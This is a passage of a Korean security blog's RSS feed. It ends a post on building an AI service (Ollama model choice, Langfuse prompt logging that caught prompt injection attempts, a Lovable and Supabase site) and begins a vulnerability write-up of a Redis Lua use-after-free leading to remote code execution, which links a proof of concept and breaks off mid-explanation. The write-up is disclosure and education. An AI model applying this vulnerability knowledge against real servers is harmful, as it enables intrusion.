class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>Reasoning &#xBAA8;&#xB378;&#xC778; qwen3:30b-a3b-thinking-2507&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD14C;&#xC2A4;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Reasoning&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC; &#xBAA8;&#xB378;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC9C0; &#xC5BC;&#xB9C8; &#xC548;&#xB41C; &#xBAA8;&#xB378;&#xC774;&#xB77C; &#xADF8;&#xB7EC;&#xB824;&#xB2C8; &#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xC548; &#xC37C;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li>&#xB2E4;&#xB978; Reasoning &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xCD9C;&#xB825;&#xC774; &#xC644;&#xB8CC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xAC78;&#xB9B0;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. instruct &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC5B4;&#xC9C0;&#xAC04;&#xD55C; &#xCD9C;&#xB825;&#xAE4C;&#xC9C0;&#xB294; 2&#xBD84; &#xC548;&#xC5D0; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC9C0;&#xB9CC; reasoning&#xC744; &#xD558;&#xB294; &#xC21C;&#xAC04; 1~2&#xBD84;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; reasoning&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC131;&#xB2A5;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694;.</li><li>&#xC774;&#xBCF4;&#xB2E4; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD55C;&#xBC88;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC131;&#xB2A5;&#xC774; &#xB5A8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. phi4 14B &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, &#xC131;&#xB2A5;&#xC740; &#xCDA9;&#xBD84;&#xD588;&#xC9C0;&#xB9CC; fp16 &#xBAA8;&#xB378;&#xC744; &#xC368;&#xC57C; &#xC131;&#xB2A5;&#xC774; &#xC4F8;&#xB9CC;&#xD55C; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xB098;&#xC654;&#xB294;&#xB370;, reasoning &#xC2DC;&#xAC04;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4; &#xC2E4;&#xC0AC;&#xC6A9;&#xC5D0;&#xB294; &#xBB34;&#xB9AC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC678; Qwen3 14B, 8B, Gemma 27B, Deepseek 14B &#xB4F1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xACF5;&#xC218;&#xAC00; &#xB354; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; &#xACE0;&#xB824;&#xC0AC;&#xD56D; &#xC911;&#xC5D0; &#xC18D;&#xB3C4;, &#xC131;&#xB2A5;, &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;&#xC744; &#xACE0;&#xB824;&#xD588;&#xC744; &#xB54C; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC81C;&#xC77C; &#xC801;&#xD569;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBAA8;&#xB378;&#xC744; &#xC815;&#xD588;&#xC73C;&#xB2C8; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC138;&#xD305;&#xD558;&#xACE0; <code>ollama serve</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xB9CC;&#xD558;&#xBA74; &#xC900;&#xBE44; &#xB05D;!&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;"><a href="#2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;" class="headerlink" title="2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;"></a>2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;</h1><p>&#xC774;&#xAC83;&#xB3C4; &#xC5ED;&#xC2DC; &#x201C;LangSmith &#xC4F0;&#xBA74; &#xB418;&#xB294;&#xAC70; &#xC544;&#xB0D0;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2E4;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC5ED;&#xC2DC; &#xC194;&#xB8E8;&#xC158; &#xAC1C;&#xBC1C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD24;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xCC38;&#xC5D0; Langfuse&#xB97C; &#xC368;&#xBCF4;&#xC790;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Langfuse&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB798;&#xD3EC;&#xC5D0;&#xC11C; &#xBC1B;&#xC544; &#xBC14;&#xB85C; &#xB3C4;&#xCEE4;&#xB85C; &#xC62C;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, langchain&#xC5D0; langfuse&#xC758; callbackhandler&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC758; &#xB85C;&#xAE45;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>&#xB85C;&#xAE45;&#xC744; &#xD558;&#xBA74; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xC804;&#xC1A1;&#xC774; &#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xC751;&#xB2F5;&#xC758; &#xD004;&#xB9AC;&#xD2F0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB098; &#xC2E4;&#xD589; &#xCCB4;&#xC778;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;.</p><p>&#xADF8;&#xB9AC;&#xACE0;! &#xACF5;&#xACA9;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xC778;&#xC81D;&#xC158; &#xACF5;&#xACA9;&#xC774; &#xB0A0;&#xB77C;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xBCBD;&#xAE4C;&#xC9C0; &#xC5F4;&#xC2EC;&#xD788; &#xD558;&#xC168;&#xB294;&#xB370;&#x2026; &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC6D0;&#xD558;&#xC2DC;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xAC00;&#xC838;&#xAC00;&#xC9C0; &#xBABB;&#xD558;&#xC2E0; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>&#xC6D0;&#xB798; &#xC800;&#xD76C; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xB294; Base44&#xB85C; &#xAC1C;&#xBC1C;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB124;, &#xBA87; &#xB2EC; &#xC804;&#xC5D0; <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">$80M&#xC5D0; Wix&#xC5D0; &#xC778;&#xC218;&#xB41C; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xC774; &#xAE30;&#xC0AC;&#xB97C; &#xBCF4;&#xACE0; &#xC368;&#xBD24;&#xB294;&#xB370;&#xC694;, &#xAC04;&#xB2E8;&#xD55C; &#xB79C;&#xB529;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0;&#xB294; &#xAD1C;&#xCC2E;&#xC558;&#xB294;&#xB370;, &#xB85C;&#xADF8;&#xC778; &#xAE30;&#xB2A5; &#xC774;&#xD6C4;&#xB85C; &#xBB38;&#xC81C;&#xAC00; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xAC1C;&#xBC1C;&#xD560; &#xB54C;&#xB294; &#xC815;&#xB9D0; &#xCD5C;&#xC545;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC2DC; &#xBB58; &#xC4F8;&#xAE4C; &#xCC3E;&#xC544;&#xBCF4;&#xB358; &#xC911; &#x201C;Lovable&#xC774;&#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC694;&#xC998; &#xD56B;&#xD558;&#xB2E4;&#xB354;&#xB77C;&#x201D;&#xB294; &#xC598;&#xAE30;&#xB97C; &#xB4E3;&#xACE0; &#xC77C;&#xB2E8; &#xC368;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB611;&#xAC19;&#xC774; &#xBA3C;&#xC800; &#xBC30;&#xAEF4;&#xC628; &#xB4A4; &#xB85C;&#xADF8;&#xC778;&#xBD80;&#xD130; &#xAC1C;&#xBC1C;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; Supabase&#xB97C; &#xC5F0;&#xACB0;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Base44&#xC640; &#xB2EC;&#xB9AC; Supabase&#xB791; &#xBC14;&#xB85C; &#xC5F0;&#xB3D9;&#xB3C4; &#xB418;&#xACE0;, &#xB514;&#xBE44; &#xAD00;&#xB9AC;&#xD558;&#xAE30;&#xB3C4; &#xD3B8;&#xD558;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xB300;&#xADDC;&#xBAA8; &#xACE0;&#xAC1D;&#xC744; &#xAC10;&#xB2F9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD798;&#xB4E4;&#xAE34;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;&#xC694;(&#xC81C; &#xC9C0;&#xAC11;&#xC774;) &#xC774;&#xB807;&#xAC8C; &#xC5F0;&#xB3D9;&#xC744; &#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB9CC;&#xB4E4;&#xBA74;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>&#xB124;&#x2026; &#xBB50; &#xC27D;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xBA87; &#xBC88;&#xC758; &#xD2B8;&#xB77C;&#xC774;&#xB9CC;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAE34;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xB4A4;&#xC5D0;&#xB294; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;? &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC798; &#xC791;&#xC131;&#xD574;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC704; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD55C;&#xBC88;&#xC73C;&#xB85C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD55C;&#xBC88;&#xC5D0; &#xB410;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; Lovable &#xC8FC;&#xC2DD;&#xC744; &#xAD6C;&#xD558;&#xB7EC; &#xB2E4;&#xB154;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC5EC;&#xC804;&#xD788; &#xBB38;&#xC81C;&#xB294; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. API &#xD0A4;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C;&#xB294; &#xC798; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC; Supabase&#xC5D0; &#xC800;&#xC7A5;&#xD560; &#xB54C; API &#xD0A4; &#xC77C;&#xBD80;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;(<em>*</em>) &#xCC98;&#xB9AC;&#xD55C; &#xC0C1;&#xD0DC;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB358;&#xAC00;, &#xC784;&#xC758;&#xB85C; &#xBC84;&#xD2BC;&#xC744; &#xC5C6;&#xC564;&#xB2E4;&#xB358;&#xAC00; &#xB4F1;&#xB4F1; &#xC790;&#xC798;&#xD558;&#xAC8C; &#xC2E0;&#xACBD;&#xC368;&#xC57C;&#xD560; &#xAC83;&#xB4E4;&#xC774; &#xC880; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xAD6C;&#xD604;&#xD560; &#xAE30;&#xB2A5;&#xB4E4;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xC880; &#xB354; &#xC904;&#xC774;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798;&#xB294; &#xC8FC;&#xAC04; &#xC0AC;&#xC6A9;&#xB7C9; Top 5 &#xC774;&#xB7F0; &#xC7AC;&#xBBF8;&#xC694;&#xC18C;&#xB3C4; &#xB123;&#xC73C;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD504;&#xB86C;&#xD504;&#xD305;&#xC744; &#xB9CE;&#xC774; &#xD574;&#xC57C;&#xD574;&#xC11C; &#xC77C;&#xB2E8;&#xC740; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>&#xADF8;&#xB798;&#xB3C4; 4&#xC2DC;&#xAC04; &#xC815;&#xB3C4; &#xC0BD;&#xC9C8;&#xD55C; &#xB05D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C; &#xBBF8;&#xCC9C;&#xD55C; &#xC6F9; &#xAC1C;&#xBC1C; &#xC2E4;&#xB825;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD588;&#xB2E4;&#xBA74; 1&#xC8FC;&#xC77C;&#xC740; &#xAC78;&#xB838;&#xC744;&#xD150;&#xB370; &#xD655;&#xC2E4;&#xD788; &#xC694;&#xC998; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAC8C; &#xD6E8;&#xC52C; &#xC774;&#xB4DD;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xAC1C;&#xBC1C;&#xAE30;&#xC640; &#xBC1C;&#xD45C; &#xD604;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC5B4;&#xB5A4; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC;&#x2026; &#xADF8; &#xB54C;&#xAE4C;&#xC9C0; &#xC798; &#xC0B4;&#xC544;&#xC788;&#xB3C4;&#xB85D; &#xBE4C;&#xC5B4;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xBC14;&#xC774;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-49844 : Redis의 Lua 스크립트를 통한 Use After Free로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</link>
      <guid>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</guid>
      <pubDate>Wed, 29 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dwisiswant0/CVE-2025-49844&quot;&gt;http</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dwisiswant0/CVE-2025-49844">https://github.com/dwisiswant0/CVE-2025-49844</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Redis server &#x2264; 8.2.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBE44;&#xC815;&#xD615; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C; Redis&#xC5D0;&#xC11C; UAF&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Redis&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC704;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Lua 5.1&#xC744; &#xB0B4;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4; &#xB4E4;&#xC774;&#xB294; <code>luaY_parser()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>Lua&#xC5D0;&#xC11C;&#xB294; Lua &#xC2A4;&#xD0DD;&#xC744; &#xD1B5;&#xD574; &#xD568;&#xC218; &#xD638;&#xCD9C;, &#xC5F0;&#xC0B0;, &#xC9C0;&#xC5ED; &#xBCC0;&#xC218; &#xC800;&#xC7A5; &#xB4F1; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; C&#xC758; <code>malloc()</code>, <code>free()</code>&#xCC98;&#xB7FC; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; Lua&#xC5D0;&#xC11C;&#xB294; GC(Garbage Collector)&#xB97C; &#xD1B5;&#xD574; &#xB354; &#xC774;&#xC0C1; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC1D;&#xCCB4;(&#xBB38;&#xC790;&#xC5F4;, &#xD14C;&#xC774;&#xBE14; &#xB4F1;)&#xB97C; &#xCC3E;&#xC544; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xAC12;&#xC740; &#xACE0;&#xC815;(Pinning)&#xD558;&#xC5EC; GC&#xC5D0;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xBA74;, 